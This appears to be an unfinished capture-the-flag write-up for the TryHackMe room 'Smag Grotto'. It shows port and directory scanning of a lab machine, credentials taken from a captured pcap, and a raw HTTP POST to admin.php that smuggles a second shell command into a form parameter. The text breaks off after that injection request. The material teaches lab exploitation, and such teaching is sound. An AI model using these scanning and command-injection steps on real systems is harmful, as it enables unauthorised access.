# [Smag Grotto](https://tryhackme.com/room/smaggrotto)

## Follow the yellow brick road.

# Smag Grotto

## Deploy the machine and get root privileges.

### What is the user flag?

1. ...

```bash
nmap 10.10.194.142
```

[SCREEN01]

2. ...
   - We have discovered `/mail/` endpoint

```bash
gobuster dir -u http://10.10.194.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt
```

[SCREEN02]

3. Download `dHJhY2Uy.pcap` from `http://10.10.194.142/mail/` ...

4. Open the file ...
   - `development.smag.thm`
   - `helpdesk:cH4nG3M3_n0w`

[SCREEN03]

```bash
echo '10.10.194.142 development.smag.thm' >> /etc/hosts
```

5. loging to `http://development.smag.thm/login.php` redirects to `http://development.smag.thm/admin.php` ...

6. ...

```
POST /admin.php HTTP/1.1
Host: development.smag.thm
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Content-Length: 37
Cookie: PHPSESSID=kp8l702c7iptp3paktkq9mfb34

command=echo+test%3B+uname+-a&submit=
```
